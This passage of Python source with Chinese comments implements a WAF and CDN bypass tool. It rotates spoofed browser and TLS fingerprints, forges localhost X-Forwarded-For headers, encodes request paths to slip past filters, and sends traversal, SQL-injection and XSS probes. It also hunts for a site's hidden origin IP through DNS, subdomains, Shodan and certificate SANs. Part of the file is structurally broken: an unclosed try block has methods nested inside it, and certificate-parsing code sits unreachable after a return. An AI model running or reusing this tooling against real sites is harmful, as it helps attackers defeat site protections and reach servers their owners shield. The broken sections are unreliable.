                method=strategy['name'],
                url=url,
                details={'error': f'所有浏览器指纹均失败，共测试{len(optimal_profiles)}个指纹'}
            )
            
        except Exception as e:
            self.logger.error(f"[!] 增强策略执行失败 {strategy['name']}: {type(e).__name__} - {e}")
            return BypassResult(
                success=False,
                method=strategy['name'],
                url=url,
                details={'error': f'策略执行异常: {type(e).__name__} - {str(e)}'}
            )
    
    def _select_optimal_profiles(self, strategy_name: str) -> List[str]:
        """为不同策略选择最优浏览器指纹 - 10种指纹智能选择"""
        # 根据策略类型选择最佳浏览器指纹组合
        profile_strategies = {
            # 源站直连 - 现代+移动端 (容易被信任)
            'direct_origin': ['chrome_120', 'firefox_119', 'safari_ios'],
            
            # 头部操纵 - 旧版+特殊 (绕过现代检测)
            'header_manipulation': ['chrome_112', 'firefox_102', 'okhttp'],
            
            # 编码绕过 - 混合策略 (覆盖不同解析器)
            'encoding_bypass': ['opera_105', 'chrome_android', 'edge_120'],
            
            # WebSocket - 现代浏览器 (协议支持好)
            'websocket': ['chrome_120', 'firefox_119', 'safari_17'],
            
            # GraphQL - 移动+现代 (API客户端常见)
            'graphql': ['chrome_android', 'okhttp', 'chrome_120'],
            
            # 缓存投毒 - 旧版+罕见 (绕过缓存指纹检测)
            'cache_poison': ['firefox_102', 'opera_105', 'chrome_112'],
            
            # 协议混淆 - 旧版浏览器 (协议处理差异)
            'protocol_confusion': ['chrome_112', 'firefox_102'],
            
            # 边缘案例 - 特殊+移动 (解析器差异大)
            'edge_cases': ['okhttp', 'safari_ios', 'chrome_android'],
            
            # 默认策略 - 平衡覆盖
            'default': ['chrome_120', 'firefox_119', 'safari_17', 'chrome_android']
        }
        
        selected = profile_strategies.get(strategy_name, profile_strategies['default'])
        
        # 过滤掉未初始化成功的指纹
        available_profiles = [p for p in selected if p in self.tls_sessions]
        
        # 如果没有可用的，回退到基础指纹
        if not available_profiles:
            available_profiles = ['chrome_120', 'firefox_119']
            available_profiles = [p for p in available_profiles if p in self.tls_sessions]
        
        return available_profiles
    
    def _get_optimal_profile_with_rotation(self, strategy_name: str) -> str:
        """智能指纹轮换 - 防止被WAF封禁"""
        # 获取策略对应的指纹列表
        candidate_profiles = self._select_optimal_profiles(strategy_name)
        
        # 过滤掉被封的指纹
        available_profiles = [p for p in candidate_profiles if p not in self.profile_rotation['blocked_profiles']]
        
        if not available_profiles:
            # 如果所有指纹都被封，重置封禁列表
            self.logger.warning("[!] 所有指纹被封，重置封禁列表")
            self.profile_rotation['blocked_profiles'].clear()
            available_profiles = candidate_profiles
        
        # 选择成功率最高且使用次数较少的指纹
        best_profile = None
        best_score = -1
        
        for profile in available_profiles:
            if profile not in self.tls_sessions:
                continue
                
            # 计算综合评分：成功率 - 使用频率惩罚
            success_rate = (self.stats['profile_success'][profile] / 
                          max(self.stats['profile_usage'][profile], 1))
            usage_penalty = self.stats['profile_usage'][profile] * 0.1
            score = success_rate - usage_penalty
            
            if score > best_score:
                best_score = score
                best_profile = profile
        
        # 如果没有找到最佳的，使用第一个可用的
        if not best_profile:
            best_profile = available_profiles[0] if available_profiles else 'chrome_120'
        
        # 更新轮换计数
        self.profile_rotation['rotation_count'] += 1
        
        return best_profile
    
    def _record_profile_result(self, profile: str, success: bool, error: str = None):
        """记录指纹使用结果"""
        self.stats['profile_usage'][profile] += 1
        
        if success:
            self.stats['profile_success'][profile] += 1
        else:
            # 检查是否是被封的迹象
            if error and any(blocked_sign in error.lower() for blocked_sign in 
                           ['blocked', 'banned', 'rate limit', 'too many requests']):
                self.logger.warning(f"[!] 指纹 {profile} 可能被封，加入黑名单")
                self.profile_rotation['blocked_profiles'].add(profile)
        
        # 更新成功率
        total_uses = self.stats['profile_usage'][profile]
        success_count = self.stats['profile_success'][profile]
        self.profile_rotation['success_rates'][profile] = success_count / total_uses
    
    async def _bypass_via_origin_ip_enhanced(self, url: str, origin_servers: List[OriginServer], 
                                           profile: str, use_proxy: bool = False) -> BypassResult:
        """TLS-Client增强的源站直连绕过"""
        if not origin_servers:
            return BypassResult(
                success=False,
                method='direct_origin_enhanced',
                url=url,
                details={'error': 'No origin servers found'}
            )
        
        domain = self._extract_domain(url)
        
        for server in origin_servers:
            if server.confidence < 0.5:
                continue
                
            try:
                # 构建直连URL
                parsed = urllib.parse.urlparse(url)
                direct_url = f"{parsed.scheme}://{server.ip}{parsed.path}"
                if parsed.query:
                    direct_url += f"?{parsed.query}"
                
                # 使用TLS-Client测试直连
                resp = await self._make_tls_request(
                    direct_url,
                    headers={'Host': domain},
                    profile=profile,
                    use_proxy=use_proxy
                )
                
                if resp['status_code'] == 200:
                    content = resp['text']
                    # 增强验证：检查目标指纹匹配
                    if self._verify_target_match(content):
                        result = BypassResult(
                            success=True,
                            method='direct_origin_enhanced',
                            url=direct_url,
                            details={
                                'origin_ip': server.ip,
                                'confidence': server.confidence,
                                'discovery_method': server.discovery_method,
                                'browser_profile': profile,
                                'fingerprint_verified': True,
                                'content': content,
                                'headers': resp.get('headers', {})
                            },
                            confidence=0.5,  # 临时值，立即重新评估
                            risk_level='high'
                        )
                        # 【数学引擎】动态置信度评估
                        result.confidence = self.scorer.assess(result)
                        return result
            except Exception as e:
                # 记录详细的失败信息
                error_detail = f"{type(e).__name__}: {str(e)[:100]}"
                self.logger.warning(f"    [!] 直连{server.ip}失败: {error_detail}")
                # 将错误信息添加到服务器记录中，用于最终的错误详情
                if not hasattr(server, 'failure_details'):
                    server.failure_details = []
                server.failure_details.append(error_detail)
                continue
        
        # 收集每个服务器的失败详情
        server_failures = []
        for server in origin_servers:
            failure_info = {
                'ip': server.ip,
                'confidence': server.confidence,
                'discovery_method': server.discovery_method
            }
            if hasattr(server, 'failure_details'):
                failure_info['errors'] = server.failure_details
            else:
                failure_info['errors'] = ['置信度过低，未尝试连接']
            server_failures.append(failure_info)
        
        return BypassResult(
            success=False,
            method='direct_origin_enhanced',
            url=url,
            details={
                'error': f'所有源站直连尝试失败，共测试{len(origin_servers)}个源站IP',
                'tested_servers': server_failures,
                'confidence_threshold': 0.5,
                'failure_reason': 'connection_failures_or_content_mismatch'
            }
        )
    
    async def _bypass_via_headers_enhanced(self, url: str, profile: str, use_proxy: bool = False) -> BypassResult:
        """TLS-Client增强的请求头绕过"""
        # 针对10种浏览器优化的头部组合 - 极致伪装
        profile_specific_headers = {
            # 现代桌面浏览器
            'chrome_120': {
                'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1'
            },
            'firefox_119': {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'DNT': '1',
                'Upgrade-Insecure-Requests': '1'
            },
            'safari_17': {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br'
            },
            'edge_120': {
                'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
            },
            'opera_105': {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="105", "Opera";v="105"'
            },
            
            # 移动端浏览器头部
            'chrome_android': {
                'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'Sec-Ch-Ua-Mobile': '?1',
                'Sec-Ch-Ua-Platform': '"Android"',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'X-Requested-With': 'com.android.browser'
            },
            'safari_ios': {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'X-Requested-With': 'Mobile Safari'
            },
            
            # 旧版浏览器头部 (绕过现代检测)
            'chrome_112': {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Sec-Ch-Ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"'
            },
            'firefox_102': {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',  # 注意：旧版不支持br
                'DNT': '1'
            },
            
            # 特殊客户端头部
            'okhttp': {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip',
                'Connection': 'Keep-Alive',
                'User-Agent': 'okhttp/4.10.0'  # Android应用常见
            }
        }
        
        # 获取浏览器特定头部
        browser_headers = profile_specific_headers.get(profile, {})
        
        # 测试头部组合
        test_header_sets = [
            # 基础绕过头 + 浏览器特定头
            {**self.bypass_headers, **browser_headers},
            # 仅浏览器头
            browser_headers,
            # 高级绕过头组合
            {
                **browser_headers,
                'X-Originating-IP': '127.0.0.1',
                'X-Forwarded-For': '127.0.0.1,10.0.0.1',
                'X-Real-IP': '10.0.0.1',
                'X-Forwarded-Host': 'localhost'
            }
        ]
        
        for i, headers in enumerate(test_header_sets):
            try:
                resp = await self._make_tls_request(
                    url,
                    headers=headers,
                    profile=profile,
                    use_proxy=use_proxy
                )
                
                if resp['status_code'] in [200, 301, 302]:
                    content = resp['text']
                    
                    # 检查绕过成功标志
                    if not any(waf_sig in content.lower() 
                             for waf_sig in ['cloudflare', 'access denied', 'forbidden', 'blocked']):
                        # 验证目标匹配
                        if self._verify_target_match(content):
                            result = BypassResult(
                                success=True,
                                method='header_manipulation_enhanced',
                                url=url,
                                details={
                                    'headers_used': headers,
                                    'browser_profile': profile,
                                    'header_set': i + 1,
                                    'tls_enhanced': True,
                                    'content': content,
                                    'headers': resp.get('headers', {})
                                },
                                confidence=0.5,  # 临时值，立即重新评估
                                risk_level='high'
                            )
                            # 【数学引擎】动态置信度评估
                            result.confidence = self.scorer.assess(result)
                            return result
                        
            except Exception as e:
                self.logger.warning(f"    [!] 头部绕过失败 (set {i+1}): {type(e).__name__} - {e}")
                continue
        
        return BypassResult(
            success=False,
            method='header_manipulation_enhanced',
            url=url,
            details={
                'error': f'所有头部操纵组合失败，使用浏览器指纹: {profile}',
                'browser_profile': profile,
                'header_sets_tested': len(test_header_sets),
                'failure_reason': 'header_bypass_blocked_or_detected'
            }
        )
    
    async def _bypass_via_encoding_enhanced(self, url: str, profile: str, use_proxy: bool = False) -> BypassResult:
        """TLS-Client增强的编码绕过"""
        parsed = urllib.parse.urlparse(url)
        
        # 针对10种浏览器特性的编码策略 - 极致优化
        browser_encoding_strategies = {
            # 现代浏览器 - 标准编码方式
            'chrome_120': ['url', 'unicode', 'mixed_case'],
            'firefox_119': ['utf8_overlong', 'double_url', 'hex'],
            'safari_17': ['html_entity', 'base64', 'url'],
            'edge_120': ['unicode', 'mixed_case', 'double_url'],
            'opera_105': ['utf8_overlong', 'html_entity', 'hex'],
            
            # 移动端浏览器 - 移动端特性编码
            'chrome_android': ['url', 'hex', 'unicode'],  # Android兼容性好
            'safari_ios': ['base64', 'html_entity', 'url'],  # iOS严格解析
            
            # 旧版浏览器 - 利用解析差异
            'chrome_112': ['double_url', 'mixed_case', 'utf8_overlong'],  # 旧Chrome解析宽松
            'firefox_102': ['hex', 'unicode', 'html_entity'],  # 旧Firefox特性
            
            # 特殊客户端 - 简单编码避免解析错误
            'okhttp': ['url', 'hex']  # OkHttp解析简单
        }
        
        encoding_methods = browser_encoding_strategies.get(profile, ['url', 'unicode', 'mixed_case'])
        
        # 测试路径编码
        for encoding_name in encoding_methods:
            if encoding_name not in self.encoders:
                continue
                
            encoder_func = self.encoders[encoding_name]
            
            # 编码路径
            if parsed.path and len(parsed.path) > 1:
                try:
                    encoded_path = encoder_func(parsed.path)
                    encoded_url = f"{parsed.scheme}://{parsed.netloc}{encoded_path}"
                    if parsed.query:
                        encoded_url += f"?{parsed.query}"
                    
                    # 使用TLS-Client测试
                    resp = await self._make_tls_request(
                        encoded_url,
                        profile=profile,
                        use_proxy=use_proxy
                    )
                    
                    if resp['status_code'] == 200:
                        content = resp['text']
                        if self._verify_target_match(content):
                            result = BypassResult(
                                success=True,
                                method='encoding_bypass_enhanced',
                                url=encoded_url,
                                details={
                                    'encoding': encoding_name,
                                    'browser_profile': profile,
                                    'encoded_path': encoded_path,
                                    'tls_enhanced': True,
                                    'content': content,
                                    'headers': resp.get('headers', {})
                                },
                                confidence=0.5,  # 临时值，立即重新评估
                                risk_level='medium'
                            )
                            # 【数学引擎】动态置信度评估
                            result.confidence = self.scorer.assess(result)
                            return result
                            
                except Exception as e:
                    self.logger.warning(f"    [!] 编码绕过失败 ({encoding_name}): {type(e).__name__} - {e}")
                    continue
        
        return BypassResult(
            success=False,
            method='encoding_bypass_enhanced',
            url=url,
            details={
                'error': f'所有编码绕过方法失败，使用浏览器指纹: {profile}',
                'browser_profile': profile,
                'encoding_methods_tested': encoding_methods,
                'failure_reason': 'encoding_bypass_blocked_or_unsupported'
            }
        )
    
    def _verify_target_match(self, content: str) -> bool:
        """验证响应内容是否匹配目标站点指纹"""
        if not hasattr(self, '_target_fingerprint'):
            return True  # 如果没有指纹，默认通过
        
        fp = self._target_fingerprint
        match_score = 0.0
        
        # 标题匹配
        if fp['title']:
            title_match = re.search(r'<title[^>]*>(.*?)</title>', content, re.IGNORECASE)
            if title_match and title_match.group(1).strip() == fp['title']:
                match_score += 0.4
        
        # 静态资源匹配
        if fp['static_resources']:
            matched_resources = sum(1 for resource in fp['static_resources'] if resource in content)
            if fp['static_resources']:
                match_score += (matched_resources / len(fp['static_resources'])) * 0.3
        
        # DOM模式匹配
        if fp['dom_patterns']:
            matched_patterns = sum(1 for pattern in fp['dom_patterns'] if pattern in content)
            if fp['dom_patterns']:
                match_score += (matched_patterns / len(fp['dom_patterns'])) * 0.2
        
        # 响应大小检查
        body_size = len(content)
        if fp['body_size_range'][0] <= body_size <= fp['body_size_range'][1]:
            match_score += 0.1
        
        # 阈值：匹配分数>0.5认为是目标站点
        is_match = match_score > 0.5
        if is_match:
            self.logger.info(f"    [+] 目标指纹验证通过 (分数: {match_score:.2f})")
        else:
            self.logger.warning(f"    [!] 目标指纹验证失败 (分数: {match_score:.2f})")
        
        return is_match
    
    async def _fingerprint_waf(self, url: str) -> Optional[str]:
        """旧版WAF指纹识别 - 保持兼容性"""
        # 使用缓存
        return await self._cached_operation(
            'waf',
            url,
            self._fingerprint_waf_impl,
            url
        )
    
    async def _fingerprint_waf_impl(self, url: str) -> Optional[str]:
        """WAF指纹识别的实际实现"""
        try:
            # 发送多个探测请求
            probes = [
                {'path': '/', 'method': 'GET'},
                {'path': '/../../etc/passwd', 'method': 'GET'},  # 路径遍历
                {'path': '/?id=1\'', 'method': 'GET'},  # SQL注入
                {'path': '/', 'method': 'TRACE'},  # 方法探测
                {'path': '/<script>alert(1)</script>', 'method': 'GET'}  # XSS
            ]
            
            detected_wafs = defaultdict(int)
            
            async with aiohttp.ClientSession() as session:
                for probe in probes:
                    try:
                        target = url.rstrip('/') + probe['path']
                        async with session.request(
                            probe['method'], 
                            target,
                            allow_redirects=False,
                            timeout=aiohttp.ClientTimeout(total=10),
                            ssl=False
                        ) as resp:
                            # 分析响应
                            headers = dict(resp.headers)
                            cookies = resp.cookies
                            body = await resp.text()
                            server = headers.get('Server', '').lower()
                            
                            # 检查每个WAF的特征
                            for waf_name, signatures in self.waf_signatures.items():
                                score = 0
                                
                                # 检查响应头
                                for header in signatures.get('headers', []):
                                    if any(h.lower() == header.lower() for h in headers):
                                        score += 2
                                
                                # 检查cookies
                                for cookie_prefix in signatures.get('cookies', []):
                                    if any(cookie_prefix in str(cookie.key) for cookie in cookies):
                                        score += 2
                                
                                # 检查错误信息
                                for error in signatures.get('errors', []):
                                    if error.lower() in body.lower():
                                        score += 3
                                
                                # 检查Server头
                                for server_sig in signatures.get('server', []):
                                    if server_sig.lower() in server:
                                        score += 2
                                
                                if score > 0:
                                    detected_wafs[waf_name] += score
                    
                    except Exception as e:
                        continue
            
            # 返回得分最高的WAF
            if detected_wafs:
                return max(detected_wafs.items(), key=lambda x: x[1])[0]
            
        except Exception as e:
            self.logger.error(f"[!] WAF指纹识别失败: {type(e).__name__} - {e}")
        
        return None
    
    async def _discover_origin_comprehensive(self, target_url: str, use_proxy: bool = False) -> List[OriginServer]:
        """综合源站发现"""
        origin_servers = []
        domain = self._extract_domain(target_url)
        
        # 先获取目标指纹（新增）
        await self._get_target_fingerprint(target_url, use_proxy=use_proxy)
        
        # 并发执行多种发现方法
        self.logger.info("    [*] 启动综合源站发现，使用9种发现技术...")
        discovery_tasks = [
            self._find_via_dns_history(domain),
            self._find_via_subdomains(domain),
            self._find_via_ssl_search(domain),
            self._find_via_mx_records(domain),
            self._find_via_ssl_san(target_url, use_proxy=use_proxy),
            self._find_via_favicon_hash(target_url, use_proxy=use_proxy),
            self._find_via_jarm_fingerprint(target_url, use_proxy=use_proxy),
            self._find_via_websocket_leak(target_url, use_proxy=use_proxy),
            self._find_via_unique_headers(target_url, use_proxy=use_proxy)
        ]
        
        results = await asyncio.gather(*discovery_tasks, return_exceptions=True)
        
        # 合并结果
        seen_ips = set()
        for result in results:
            if isinstance(result, list):
                for server in result:
                    if server.ip not in seen_ips:
                        seen_ips.add(server.ip)
                        origin_servers.append(server)
        
        # 验证源站
        if origin_servers:
            self.logger.info(f"    [*] 开始验证发现的{len(origin_servers)}个潜在源站...")
            origin_servers = await self._verify_origin_servers(origin_servers, domain)
        
        # 增强的排序逻辑（修复5的核心）
        # 综合考虑原始置信度和验证结果
        for server in origin_servers:
            # 根据验证结果调整最终分数
            if server.is_verified:
                server.final_score = server.confidence * 1.5  # 验证通过加权
            elif 'verification' in server.services and 'partial' in server.services['verification']:
                server.final_score = server.confidence * 0.8  # 部分匹配降权
            else:
                server.final_score = server.confidence * 0.3  # 未验证大幅降权
        
        # 按最终分数排序，只返回分数>0.3的结果
        origin_servers = [s for s in origin_servers if hasattr(s, 'final_score') and s.final_score > 0.3]
        return sorted(origin_servers, key=lambda x: x.final_score, reverse=True)
    
    async def _find_via_dns_history(self, domain: str) -> List[OriginServer]:
        """通过DNS历史记录查找"""
        # 使用缓存的DNS查询
        return await self._cached_operation(
            'dns', 
            f'dns_history_{domain}',
            self._find_via_dns_history_impl,
            domain
        )
    
    async def _find_via_dns_history_impl(self, domain: str) -> List[OriginServer]:
        """DNS历史记录查找的实际实现"""
        servers = []
        
        # 多个DNS服务器增加成功率
        dns_servers = [
            ['8.8.8.8', '8.8.4.4'],      # Google
            ['1.1.1.1', '1.0.0.1'],      # Cloudflare
            ['9.9.9.9', '149.112.112.112'], # Quad9
            ['208.67.222.222', '208.67.220.220']  # OpenDNS
        ]
        
        for nameservers in dns_servers:
            try:
                # 异步DNS查询 - 修复阻塞问题
                def _sync_dns_query():
                    resolver = dns.resolver.Resolver()
                    resolver.nameservers = nameservers
                    resolver.timeout = 3
                    resolver.lifetime = 3
                    return resolver.resolve(domain, 'A')
                
                # A记录查询 - 异步包装
                try:
                    answers = await asyncio.to_thread(_sync_dns_query)
                    for rdata in answers:
                        ip = str(rdata)
                        if not self._is_cdn_ip(ip):
                            servers.append(OriginServer(
                                ip=ip,
                                confidence=0.5,
                                discovery_method='dns_current'
                            ))
                except dns.resolver.NXDOMAIN:
                    self.logger.warning(f"[!] 域名不存在: {domain}")
                    continue
                except dns.resolver.Timeout:
                    self.logger.warning(f"[!] DNS查询超时 (服务器: {nameservers[0]})")
                    continue
                except dns.resolver.NoAnswer:
                    continue
                
                # CNAME记录查询（可能暴露源站）- 异步修复
                try:
                    def _sync_cname_query():
                        resolver = dns.resolver.Resolver()
                        resolver.nameservers = nameservers
                        resolver.timeout = 3
                        resolver.lifetime = 3
                        return resolver.resolve(domain, 'CNAME')
                    
                    cname_answers = await asyncio.to_thread(_sync_cname_query)
                    for cname in cname_answers:
                        cname_str = str(cname).rstrip('.')
                        if 'origin' in cname_str or 'direct' in cname_str:
                            # 解析CNAME的A记录 - 异步
                            try:
                                def _sync_a_query():
                                    resolver = dns.resolver.Resolver()
                                    resolver.nameservers = nameservers
                                    resolver.timeout = 3
                                    resolver.lifetime = 3
                                    return resolver.resolve(cname_str, 'A')
                                
                                a_answers = await asyncio.to_thread(_sync_a_query)
                                for rdata in a_answers:
                                    ip = str(rdata)
                                    if not self._is_cdn_ip(ip):
                                        servers.append(OriginServer(
                                            ip=ip,
                                            confidence=0.7,
                                            discovery_method='cname_leak'
                                        ))
                            except:
                                pass
                except:
                    pass
                    
                # 如果找到结果就不继续其他DNS服务器了
                if servers:
                    break
                    
            except Exception as e:
                self.logger.warning(f"[!] DNS查询异常 ({nameservers[0]}): {type(e).__name__} - {str(e)[:100]}")
                continue
        
        return list({s.ip: s for s in servers}.values())  # 去重
    
    async def _find_via_subdomains(self, domain: str) -> List[OriginServer]:
        """通过子域名暴露查找"""
        servers = []
        
        # 常见的暴露源站的子域名
        test_subdomains = [
            'origin', 'origin-www', 'origin-api',
            'direct', 'bypass', 'admin', 'cpanel',
            'ftp', 'mail', 'webmail', 'smtp',
            'staging', 'dev', 'test', 'beta',
            'api', 'api-internal', 'backend',
            'ns1', 'ns2', 'dns1', 'dns2'
        ]
        
        try:
            self.logger.info(f"    [*] 开始子域名扫描，测试{len(test_subdomains)}个子域名...")
            # 异步子域名DNS查询 - 修复阻塞
            async def _resolve_subdomain(subdomain):
                try:
                    full_domain = f"{subdomain}.{domain}"
                    
                    def _sync_subdomain_query():
                        resolver = dns.resolver.Resolver()
                        resolver.timeout = 2
                        resolver.lifetime = 2
                        return resolver.resolve(full_domain, 'A')
                    
                    answers = await asyncio.to_thread(_sync_subdomain_query)
                    subdomain_servers = []
                    for rdata in answers:
                        ip = str(rdata)
                        if not self._is_cdn_ip(ip):
                            subdomain_servers.append(OriginServer(
                                ip=ip,
                                confidence=0.7,
                                discovery_method=f'subdomain_{subdomain}'
                            ))
                    return subdomain_servers
                except dns.resolver.NXDOMAIN:
                    return []
                except dns.resolver.Timeout:
                    return []
                except Exception:
                    return []
            
            # 并发查询所有子域名 - 性能大幅提升
            subdomain_tasks = [_resolve_subdomain(sub) for sub in test_subdomains]
            results = await asyncio.gather(*subdomain_tasks, return_exceptions=True)
            
            # 合并结果
            for result in results:
                if isinstance(result, list):
                    servers.extend(result)
                        
        except Exception as e:
            self.logger.warning(f"[!] 子域名扫描异常: {type(e).__name__} - {str(e)[:100]}")
        
        return servers
    
    async def _find_via_ssl_search(self, domain: str) -> List[OriginServer]:
        """通过SSL证书搜索查找"""
        servers = []
        
        if self.shodan_client:
            try:
                # 异步Shodan搜索 - 修复阻塞
                def _sync_shodan_search():
                    query = f'ssl.cert.subject.cn:"{domain}"'
                    return self.shodan_client.search(query, limit=20)
                
                results = await asyncio.to_thread(_sync_shodan_search)
                
                for result in results['matches']:
                    ip = result['ip_str']
                    if not self._is_cdn_ip(ip):
                        servers.append(OriginServer(
                            ip=ip,
                            confidence=0.8,
                            discovery_method='ssl_certificate',
                            ports=[result.get('port', 443)]
                        ))
            except Exception as e:
                self.logger.warning(f"[!] SSL证书搜索失败: {type(e).__name__} - {e}")
        
        return servers
    
    async def _find_via_mx_records(self, domain: str) -> List[OriginServer]:
        """通过邮件服务器记录查找"""
        servers = []
        
        try:
            # 异步MX记录查询 - 修复阻塞
            def _sync_mx_query():
                resolver = dns.resolver.Resolver()
                resolver.timeout = 2
                resolver.lifetime = 2
                return resolver.resolve(domain, 'MX')
            
            # 查询MX记录
            try:
                mx_records = await asyncio.to_thread(_sync_mx_query)
                
                # 并发解析所有MX主机的IP
                async def _resolve_mx_ip(mx_host):
                    try:
                        def _sync_mx_a_query():
                            resolver = dns.resolver.Resolver()
                            resolver.timeout = 2
                            resolver.lifetime = 2
                            return resolver.resolve(mx_host, 'A')
                        
                        answers = await asyncio.to_thread(_sync_mx_a_query)
                        mx_servers = []
                        for rdata in answers:
                            ip = str(rdata)
                            mx_servers.append(OriginServer(
                                ip=ip,
                                confidence=0.6,
                                discovery_method='mx_record'
                            ))
                        return mx_servers
                    except:
                        return []
                
                # 并发查询所有MX主机
                mx_hosts = [str(mx.exchange).rstrip('.') for mx in mx_records]
                mx_tasks = [_resolve_mx_ip(mx_host) for mx_host in mx_hosts]
                mx_results = await asyncio.gather(*mx_tasks, return_exceptions=True)
                
                # 合并结果
                for result in mx_results:
                    if isinstance(result, list):
                        servers.extend(result)
            except:
                pass
                
        except Exception as e:
            self.logger.warning(f"[!] MX记录查询失败: {type(e).__name__} - {e}")
        
        return servers
    
    async def _find_via_ssl_san(self, url: str, use_proxy: bool = False) -> List[OriginServer]:
        """通过SSL证书SAN找关联域名 - 高价值方法"""
        # 使用缓存 - 修复use_proxy参数传递
        cache_key = f"ssl_san_{url}_{use_proxy}"
        return await self._cached_operation(
            'ssl_san',
            cache_key,
            self._find_via_ssl_san_impl,
            url, use_proxy
        )
    
    async def _find_via_ssl_san_impl(self, url: str, use_proxy: bool = False) -> List[OriginServer]:
        """SSL SAN查找的实际实现"""
        servers = []
        domain = self._extract_domain(url)
        
        try:
            # 获取SSL证书
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # 解析主机和端口
            if url.startswith(('http://', 'https://')):
                parsed = urllib.parse.urlparse(url)
                host = parsed.hostname
                port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            else:
                host = domain
                port = 443
            
            # 建立SSL连接获取证书 - 修复代理支持
            async def _get_ssl_cert():
                self.logger.debug(f"[SSL调试] 开始连接 {host}:{port}")
                self.logger.debug(f"[SSL调试] 代理模式: {use_proxy}")
                
                if use_proxy and PROXY_AVAILABLE:
                    # 代理模式 - 使用aiohttp代理连接获取证书
                    return await self._get_cert_via_proxy(host, port)
                else:
                    # 直连模式 - 原始socket连接
                    return await self._get_cert_direct(host, port, context)
            
            cert = await _get_ssl_cert()
    
    async def _get_cert_via_proxy(self, host: str, port: int) -> dict:
        """通过代理获取SSL证书"""
        try:
            self.logger.debug(f"[SSL调试] 使用代理获取证书: {host}:{port}")
            
            # 获取代理会话
            proxy_session_result = await get_proxy_session()
            if not proxy_session_result:
                self.logger.warning(f"[SSL调试] 代理会话获取失败，降级到直连")
                context = ssl.create_default_context()
                context.check_hostname = False  
                context.verify_mode = ssl.CERT_NONE
                return await self._get_cert_direct(host, port, context)
            
            session, proxy_url = proxy_session_result
            self.logger.debug(f"[SSL调试] 使用代理: {proxy_url}")
            
            # 使用aiohttp通过代理建立SSL连接获取证书信息
            try:
                test_url = f"https://{host}:{port}/"
                async with session.get(test_url, ssl=False) as response:
                    # 从连接信息获取证书（简化版本）
                    self.logger.debug(f"[SSL调试] 代理SSL连接成功: {response.status}")
                    # 注意：aiohttp模式下直接获取证书比较复杂
                    # 这里返回基本信息，或者降级到直连模式
                    return {}
            finally:
                await session.close()
                
        except Exception as e:
            self.logger.warning(f"[SSL调试] 代理SSL连接失败: {type(e).__name__} - {str(e)}")
            # 降级到直连模式
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            return await self._get_cert_direct(host, port, context)
    
    async def _get_cert_direct(self, host: str, port: int, context) -> dict:
        """直连模式获取SSL证书"""
        def _sync_ssl_connect():
            self.logger.debug(f"[SSL调试] 直连模式连接: {host}:{port}")
            
            try:
                sock = socket.create_connection((host, port), timeout=5)
                self.logger.debug(f"[SSL调试] 套接字连接成功")
                
                ssock = context.wrap_socket(sock, server_hostname=host)
                self.logger.debug(f"[SSL调试] SSL握手成功")
                
                cert = ssock.getpeercert()
                self.logger.debug(f"[SSL调试] 证书获取成功")
                
                ssock.close()
                sock.close()
                return cert
                
            except ssl.SSLError as ssl_err:
                self.logger.warning(f"[SSL调试] 直连SSL握手失败: {type(ssl_err).__name__} - {str(ssl_err)}")
                self.logger.warning(f"[SSL调试] 失败主机: {host}:{port}")
                raise ssl_err
            except socket.error as sock_err:
                self.logger.warning(f"[SSL调试] 直连套接字失败: {type(sock_err).__name__} - {str(sock_err)}")
                raise sock_err
        
        return await asyncio.to_thread(_sync_ssl_connect)
        
        # 提取SAN (Subject Alternative Names)
        san_list = []
        if cert and 'subjectAltName' in cert:
            for type_, value in cert['subjectAltName']:
                if type_ == 'DNS':
                    san_list.append(value)
        
        # 分析SAN中的域名
        origin_patterns = [
            'origin', 'source', 'real', 'actual', 'direct',
            'internal', 'private', 'backend', 'server',
            'node', 'web', 'www-origin', 'www-real'
        ]
        
        # 异步解析SAN域名 - 修复resolver阻塞
        async def _resolve_san_domain(san_domain):
            try:
                # 检查是否包含源站关键词
                is_potential_origin = any(pattern in san_domain.lower() for pattern in origin_patterns)
                
                # 跳过通配符证书
                if san_domain.startswith('*.'):
                    san_domain = san_domain[2:]
                
                # 如果不是当前域名且可能是源站
                if san_domain != domain and (is_potential_origin or 'cdn' not in san_domain.lower()):
                    def _sync_san_resolve():
                        resolver = dns.resolver.Resolver()
